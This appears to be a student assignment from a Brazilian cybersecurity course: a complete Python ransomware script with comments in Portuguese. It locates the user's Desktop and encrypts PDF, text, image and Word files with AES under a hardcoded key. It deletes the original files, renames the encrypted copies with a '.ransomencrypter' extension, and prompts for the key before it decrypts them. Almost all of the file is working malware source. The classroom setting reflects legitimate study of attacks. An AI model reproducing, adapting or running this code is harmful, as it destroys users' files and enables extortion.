'''
FIAP
Defesa Cibernética - 1TDCF - 2021
Development e Coding for Security
Prof. Ms. Fábio H. Cabrini
Atividade: Proposta da Global Solution 
Alunos:
Fernando De Souza – RM88717
Gabriel Anselmo Pires Dos Santos - RM87010
João Paulo Silva de Queiroz - RM86376
Mateus Amado Monteiro da Silva - RM87974
Tomás Esteves Andrade - RM89081
'''

import os  # sistema operacional
import glob  # busca os arquivos
import pyaes  # biblioteca de criptografia aes
from pathlib import Path  # pathlib utilizada para setar os caminhos

lst_arqui = ['*.pdf', '*.txt', '*.jpg', '*.doc', ]
print('Criptografando')


# Entra no Desktop e faz a verificação
try:
    desktop = Path.home() / "Desktop"
except Exception:
    pass
os.chdir(desktop)  #utilizado para definir o caminho que no caso é o desktop


def criptografando():
    for arquivos in lst_arqui:
        for format_arqui in glob.glob(arquivos):
            print(format_arqui)
            A = open(f'{desktop}\\{format_arqui}', 'rb')  # rb = read binary e wb = write binary
            data_arqui = A.read()
            A.close()
            os.remove(f'{desktop}\\{format_arqui}')
            key = b"lkghpryvxzkjfdtc"  # uma chave qualquer que tenha 16 caracteres
            aes = pyaes.AESModeOfOperationCTR(key)  # gera a criptografia
            crypto_data = aes.encrypt(data_arqui)
            novo_arqui = format_arqui + ".ransomencrypter"
            novo_arqui = open(f'{desktop}\\{novo_arqui}', 'wb')
            novo_arqui.write(crypto_data)
            novo_arqui.close()


def descrypt(decrypt_file):
    try:
        for arquivo in glob.glob('*.ransomencrypter'):
            decryptf = decrypt_file.encode()
            name_arquivo = open(arquivo, 'rb')
            data_arqui = name_arquivo.read()
            akey = decryptf
            aaes = pyaes.AESModeOfOperationCTR(akey)  # gera a decriptografia
            decrypt_data = aaes.decrypt(data_arqui)
            format_file = arquivo.split('.')
            new_nome_arquivo = format_file[0] + '.' + format_file[1]  #é aqui onde ele retorna o arquivo ao desktop
            dnovo_arquivo = open(f'{desktop}\\{new_nome_arquivo}', 'wb')
            dnovo_arquivo.write(decrypt_data)
    except ValueError as err:
        print()


if __name__ == '__main__': #conceito da variável __name__, com uma condição que verifica se essa variável é igual a ’__main__’, o que há é apenas uma verificação de se o programa está sendo executado por si só.
    criptografando()
    if criptografando:
        key = input('Seu computador foi criptografado :p, informe a chave  para liberar os arquivos:')
        if key == 'lkghpryvxzkjfdtc':  # confirma se a chave de descriptografia foi colocada corretamente e entãos descriptografa
            descrypt(key)
            for del_file in glob.glob('*.ransomencrypter'):
                os.remove(f'{desktop}\\{del_file}')
            print('seu pc foi descriptografado')
        else:
            print('Chave de liberação inválida, que pena ;(')
